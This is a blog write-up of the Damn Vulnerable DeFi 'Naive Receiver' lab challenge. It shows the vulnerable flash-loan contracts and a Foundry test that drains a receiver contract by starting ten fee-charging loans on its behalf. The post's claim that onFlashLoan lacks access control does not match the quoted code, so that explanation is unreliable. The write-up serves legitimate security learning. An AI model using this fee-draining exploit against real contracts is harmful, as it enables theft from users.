<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="12345There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and rec">
<meta property="og:type" content="article">
<meta property="og:title" content="DamnVulnerableDeFi-2">
<meta property="og:url" content="http://example.com/2023/12/28/DamnVulnerableDeFi-2/index.html">
<meta property="og:site_name" content="KK&#39;s Note">
<meta property="og:description" content="12345There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and rec">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-12-28T02:39:55.000Z">
<meta property="article:modified_time" content="2024-02-04T07:24:14.000Z">
<meta property="article:author" content="KKontheway">
<meta property="article:tag" content="Defi">
<meta property="article:tag" content="DamnVulnerableDefi">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>DamnVulnerableDeFi-2</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.0.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Archives</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/kkontheway">Projects</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/12/28/About-FuzzingTest/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/12/28/DamnVulnerableDeFi-1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/12/28/DamnVulnerableDeFi-2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&text=DamnVulnerableDeFi-2"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&title=DamnVulnerableDeFi-2"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&is_video=false&description=DamnVulnerableDeFi-2"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=DamnVulnerableDeFi-2&body=Check out this article: http://example.com/2023/12/28/DamnVulnerableDeFi-2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&title=DamnVulnerableDeFi-2"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&title=DamnVulnerableDeFi-2"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&title=DamnVulnerableDeFi-2"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&title=DamnVulnerableDeFi-2"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&name=DamnVulnerableDeFi-2&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&t=DamnVulnerableDeFi-2"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Code"><span class="toc-number">1.</span> <span class="toc-text">Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Observation"><span class="toc-number">2.</span> <span class="toc-text">Observation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack"><span class="toc-number">3.</span> <span class="toc-text">Attack</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        DamnVulnerableDeFi-2
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">KKontheway</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-12-28T02:39:55.000Z" class="dt-published" itemprop="datePublished">2023-12-28</time>
        
        (Updated: <time datetime="2024-02-04T07:24:14.000Z" class="dt-updated" itemprop="dateModified">2024-02-04</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/DamnVulnerableDefi/">DamnVulnerableDefi</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/DamnVulnerableDefi/" rel="tag">DamnVulnerableDefi</a>, <a class="p-category" href="/tags/Defi/" rel="tag">Defi</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.</span><br><span class="line"></span><br><span class="line">A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.</span><br><span class="line"></span><br><span class="line">Take all ETH out of the user’s contract. If possible, in a single transaction.</span><br></pre></td></tr></table></figure>

<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p><code>NaiveReceiverLenderPool.sol</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashLender.sol&quot;;</span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line">import &quot;../../lib/solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line">import &quot;./FlashLoanReceiver.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title NaiveReceiverLenderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract NaiveReceiverLenderPool is ReentrancyGuard, IERC3156FlashLender &#123;</span><br><span class="line">    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;</span><br><span class="line">    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan</span><br><span class="line">    bytes32 private constant CALLBACK_SUCCESS = keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line">    error UnsupportedCurrency();</span><br><span class="line">    error CallbackFailed();</span><br><span class="line"></span><br><span class="line">    function maxFlashLoan(address token) external view returns (uint256) &#123;</span><br><span class="line">        if (token == ETH) &#123;</span><br><span class="line">            return address(this).balance;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashFee(address token, uint256) external pure returns (uint256) &#123;</span><br><span class="line">        if (token != ETH) revert UnsupportedCurrency();</span><br><span class="line">        return FIXED_FEE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)</span><br><span class="line">        external</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        if (token != ETH) revert UnsupportedCurrency();</span><br><span class="line"></span><br><span class="line">        uint256 balanceBefore = address(this).balance;</span><br><span class="line"></span><br><span class="line">        // Transfer ETH and handle control to receiver</span><br><span class="line">        SafeTransferLib.safeTransferETH(address(receiver), amount);</span><br><span class="line">        if (receiver.onFlashLoan(msg.sender, ETH, amount, FIXED_FEE, data) != CALLBACK_SUCCESS) &#123;</span><br><span class="line">            revert CallbackFailed();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (address(this).balance &lt; balanceBefore + FIXED_FEE) &#123;</span><br><span class="line">            revert RepayFailed();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Allow deposits of ETH</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>FlashloanReceiver.sol</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../../lib/solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line">import &quot;./NaiveReceiverLenderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title FlashLoanReceiver</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract FlashLoanReceiver is IERC3156FlashBorrower &#123;</span><br><span class="line">    address private pool;</span><br><span class="line">    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;</span><br><span class="line"></span><br><span class="line">    error UnsupportedCurrency();</span><br><span class="line"></span><br><span class="line">    constructor(address _pool) &#123;</span><br><span class="line">        pool = _pool;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)</span><br><span class="line">        external</span><br><span class="line">        returns (bytes32)</span><br><span class="line">    &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            // gas savings</span><br><span class="line">            if iszero(eq(sload(pool.slot), caller())) &#123;</span><br><span class="line">                mstore(0x00, 0x48f5c3ed)</span><br><span class="line">                revert(0x1c, 0x04)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (token != ETH) revert UnsupportedCurrency();</span><br><span class="line"></span><br><span class="line">        uint256 amountToBeRepaid;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            amountToBeRepaid = amount + fee;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _executeActionDuringFlashLoan();</span><br><span class="line"></span><br><span class="line">        // Return funds to pool</span><br><span class="line">        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);</span><br><span class="line"></span><br><span class="line">        return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Internal function where the funds received would be used</span><br><span class="line">    function _executeActionDuringFlashLoan() internal &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // Allow deposits of ETH</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p><code>NaiveReceiverLenderPool.sol</code>：<br>The contract is a lending pool that allows flash loans with a fixed fee of 1 ether . which means we need to repay our debt plus 1 ether after doing a flash loan.</p>
<p>Our Goal is to make the users account &#x3D;&gt; 0 ether , so maybe i will try to do ten times flashloan , which can make users account to 0 ether . </p>
<p>Vuln is in <code>onFlashLoan</code> function there is no access control . The first address is assumed.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)</span><br><span class="line">        external</span><br><span class="line">        returns (bytes32)</span><br><span class="line">    &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            // gas savings</span><br><span class="line">            if iszero(eq(sload(pool.slot), caller())) &#123;</span><br><span class="line">                mstore(0x00, 0x48f5c3ed)</span><br><span class="line">                revert(0x1c, 0x04)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (token != ETH) revert UnsupportedCurrency();</span><br><span class="line">        uint256 amountToBeRepaid;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            amountToBeRepaid = amount + fee;</span><br><span class="line">        &#125;</span><br><span class="line">        _executeActionDuringFlashLoan();</span><br><span class="line">        // Return funds to pool</span><br><span class="line">        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);</span><br><span class="line">        return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The function onFlashLoan is <strong>expected</strong> to be called by the flash loan contract, not the initiator. You should check msg.sender is the flash loan contract inside the onFlashLoan() function because this function is external and anyone can call it.</p>
</blockquote>
<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../../src/2-naive-receiver/FlashLoanReceiver.sol&quot;;</span><br><span class="line">import &quot;../../src/2-naive-receiver/NaiveReceiverLenderPool.sol&quot;;</span><br><span class="line">import &quot;../../lib/forge-std/src/Test.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract NaiveReceiverLenderPoolTest is Test &#123;</span><br><span class="line">    NaiveReceiverLenderPool pool;</span><br><span class="line">    FlashLoanReceiver receiver;</span><br><span class="line"></span><br><span class="line">    uint256 internal constant INITIAL_BALANCE_Pool = 1000 ether;</span><br><span class="line">    uint256 internal constant INITIAL_BALANCE_Receiver = 10 ether;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        pool = new NaiveReceiverLenderPool();</span><br><span class="line">        receiver = new FlashLoanReceiver(address(pool));</span><br><span class="line">        vm.deal(address(pool), INITIAL_BALANCE_Pool);</span><br><span class="line">        vm.deal(address(receiver), INITIAL_BALANCE_Receiver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testAttackFlashLoan() public &#123;</span><br><span class="line">        assertEq(address(pool).balance, INITIAL_BALANCE_Pool);</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">            pool.flashLoan(</span><br><span class="line">                IERC3156FlashBorrower(receiver), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), 1, &quot;0x&quot;</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        assertEq(address(receiver).balance, 0);</span><br><span class="line">        assertEq(address(pool).balance, INITIAL_BALANCE_Pool + INITIAL_BALANCE_Receiver);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Archives</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/kkontheway">Projects</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Code"><span class="toc-number">1.</span> <span class="toc-text">Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Observation"><span class="toc-number">2.</span> <span class="toc-text">Observation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack"><span class="toc-number">3.</span> <span class="toc-text">Attack</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/12/28/DamnVulnerableDeFi-2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&text=DamnVulnerableDeFi-2"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&title=DamnVulnerableDeFi-2"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&is_video=false&description=DamnVulnerableDeFi-2"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=DamnVulnerableDeFi-2&body=Check out this article: http://example.com/2023/12/28/DamnVulnerableDeFi-2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&title=DamnVulnerableDeFi-2"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&title=DamnVulnerableDeFi-2"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&title=DamnVulnerableDeFi-2"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&title=DamnVulnerableDeFi-2"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&name=DamnVulnerableDeFi-2&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/12/28/DamnVulnerableDeFi-2/&t=DamnVulnerableDeFi-2"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    KKontheway
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Archives</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/kkontheway">Projects</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
